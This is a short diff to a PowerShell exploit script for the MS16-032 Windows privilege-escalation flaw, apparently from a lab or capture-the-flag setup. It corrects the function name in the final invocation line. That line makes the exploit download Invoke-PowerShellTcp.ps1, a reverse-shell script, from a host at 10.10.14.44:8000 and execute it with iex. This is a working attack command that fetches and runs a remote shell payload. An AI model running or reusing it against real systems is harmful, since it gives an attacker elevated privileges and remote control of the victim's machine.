@@ -367,4 +367,4 @@ function Invoke-MS16-032 {
         $SafeGuard.Stop()
     }
 }
-Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.44:8000/Invoke-PowerShellTcp.ps1')"
+Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.44:8000/Invoke-PowerShellTcp.ps1')"
